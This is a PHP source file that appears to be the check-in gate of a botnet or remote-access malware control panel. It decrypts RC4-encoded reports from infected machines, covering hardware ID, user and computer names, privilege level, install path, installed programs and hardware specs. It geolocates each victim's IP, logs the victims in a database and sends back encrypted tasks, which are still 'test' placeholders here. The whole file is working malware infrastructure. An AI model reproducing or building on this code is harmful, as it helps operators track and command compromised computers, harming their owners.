<?php
include 'include/config.php';
include 'include/rc4.php';
include 'include/geo.php';

function decryptClient($rc4Key, $info, $new)
{
    foreach ($info as $key => $value) { if($key != "fp") { $info[$key] = rc4($rc4Key, base64_decode($value)); } }
    if($new) 
    { 
        foreach ($info["fp"] as &$value) { $value = rc4($rc4Key, base64_decode($value)); } 
        $info["fp"] = serialize($info["fp"]);
    }
    if ($info["check"] != "check") {  return "error"; }
    else 
    {
        $keys =  array("bn" => "buildName", "bt" => "buildType", "bu" => "buildVersion",
                    "ca" => "cpuArchitecture", "cc" => "cpuCores", "cn" => "computerName",
                    "cp" => "cpu", "gp" => "gpu", "hw" => "hwid",
                    "ip" => "installPath", "os" => "operatingSystem", "pr" => "privilege",
                    "ra" => "ram", "un" => "userName", "vr" => "vram",
                    "fp" => "foundPrograms", "ct" => "currentTask");
        foreach ($keys as $key => $value)
        {
            foreach ($info as $iKey => $iValue)
            {
                if ($iKey == $key)
                {
                    $info[$value] = $info[$iKey];
                    unset($info[$iKey]);
                }
            }
        }
        $info['ipAddr'] = $_SERVER['REMOTE_ADDR'];
        $info['country'] = ip_info($info['ipAddr'], "Country Code");
        if (empty($info["country"])) { $info["country"] = "RU"; }
        return $info; 
    }
}

if($_POST['new'] == "true")  { $clientInfo = decryptClient($rc4Key, json_decode(base64_decode($_POST['request']), true), true); }
if($_POST['new'] == "false") { $clientInfo = decryptClient($rc4Key, json_decode(base64_decode($_POST['request']), true), false); }

$exs = $odb->prepare("SELECT COUNT(*) FROM clients WHERE hwid = :h");
$exs->execute(array(":h" => $clientInfo['hwid']));
if ($exs->fetchColumn(0) == "0")
{
    $i = $odb->prepare("INSERT INTO clients (id, hwid, buildName, buildType, buildVersion, cpuArchitecture, cpuCores, computerName, cpu, gpu, installPath, operatingSystem, privilege, ram, userName, vram, ipAddr, country, foundPrograms, installDate, lastKnock, currentTask, mark) VALUES(NULL, :hwid, :buildName, :buildType, :buildVersion, :cpuArchitecture, :cpuCores, :computerName, :cpu, :gpu, :installPath, :operatingSystem, :privilege, :ram, :userName, :vram, :ipAddr, :country, :foundPrograms, UNIX_TIMESTAMP(), UNIX_TIMESTAMP(), :currentTask, :mark)");
    $i->execute(array(":hwid" => $clientInfo["hwid"], ":buildName" => $clientInfo["buildName"],
                        ":buildType" => $clientInfo["buildType"], ":buildVersion" => $clientInfo["buildVersion"],
                        ":cpuArchitecture" => $clientInfo["cpuArchitecture"], ":cpuCores" => $clientInfo["cpuCores"],
                        ":computerName" => $clientInfo["computerName"], ":cpu" => $clientInfo["cpu"],
                        ":gpu" => $clientInfo["gpu"], ":installPath" => $clientInfo["installPath"],
                        ":operatingSystem" => $clientInfo["operatingSystem"], ":privilege" => $clientInfo["privilege"],
                        ":ram" => $clientInfo["ram"], ":userName" => $clientInfo["userName"],
                        ":vram" => $clientInfo["vram"], ":ipAddr" => $clientInfo["ipAddr"],
                        "country" => $clientInfo["country"], ":foundPrograms" => $clientInfo["foundPrograms"],
                        ":currentTask" => "N/A", ":mark" => "1"));
}
else
{
    $u = $odb->prepare("UPDATE clients SET lastKnock = UNIX_TIMESTAMP(), buildVersion = :buildVersion, currentTask = :currentTask, installPath = :installPath, privilege = :privilege WHERE hwid = :h");
	$u->execute(array(":buildVersion" => $clientInfo["buildVersion"], ":currentTask" => $clientInfo["currentTask"], ":installPath" => $clientInfo["installPath"], ":privilege" => $clientInfo["privilege"], ":h" => $clientInfo["hwid"]));
}
$responce = array("task" => "test", "taskId" => "test", "taskParm" => "test");
foreach ($responce as $key => $value)
{ 
    $responce[$key] = base64_encode(rc4($rc4Key, $value)); 
}

$responce = base64_encode(json_encode($responce));
print_r($clientInfo);
?>